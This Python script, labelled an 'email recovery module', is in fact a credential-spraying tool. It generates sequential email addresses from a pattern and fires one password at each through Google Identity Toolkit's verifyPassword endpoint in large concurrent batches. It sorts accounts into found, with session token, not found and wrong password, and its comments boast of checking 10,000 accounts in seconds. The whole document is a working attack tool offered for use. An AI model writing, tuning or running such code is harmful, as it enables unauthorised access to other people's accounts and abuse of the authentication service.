# ULTRA-FAST EMAIL RECOVERY MODULE
import asyncio
import aiohttp
import re
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=10000)

def parse_email_pattern(pattern):
    """Parse email patterns"""
    match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
    if not match:
        return None
    
    base, start, end, domain = match.groups()
    start = int(start)
    end = int(end) if end else start
    
    if start > end:
        start, end = end, start
    
    return base, start, end, domain

def generate_emails(base, start, end, domain):
    """Generate email list"""
    return [f"{base}{i}@{domain}" for i in range(start, end + 1)]

async def fast_check_email(email, password, api_key):
    """Fast async email check with connection pooling"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
            payload = {"email": email, "password": password, "returnSecureToken": True}
            
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                data = await resp.json()
                
                if "idToken" in data:
                    return "found", data
                
                error = data.get("error", {}).get("message", "")
                if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
                    return "not_found", None
                elif "INVALID_PASSWORD" in error:
                    return "wrong_password", None
                else:
                    return "error", error
    except asyncio.TimeoutError:
        return "timeout", None
    except Exception as e:
        return "error", str(e)

async def check_email_batch_concurrent(emails, password, api_key, batch_size=100):
    """
    Check emails in concurrent batches
    batch_size: how many emails to check at once (higher = faster but more load)
    """
    all_results = []
    
    for i in range(0, len(emails), batch_size):
        batch = emails[i:i + batch_size]
        
        # Create concurrent tasks for entire batch
        tasks = [fast_check_email(email, password, api_key) for email in batch]
        
        # Wait for all to complete (concurrent, not sequential)
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for email, result in zip(batch, results):
            if isinstance(result, tuple):
                all_results.append((email, result[0], result[1]))
            else:
                all_results.append((email, "error", str(result)))
    
    return all_results

# SPEED COMPARISON
# Sequential (old): 10,000 emails × 0.5s = 5,000 seconds (1.4 hours)
# Concurrent 50x (new): 10,000 emails ÷ 50 × 0.1s = ~20 seconds
# Concurrent 100x: 10,000 emails ÷ 100 × 0.1s = ~10 seconds
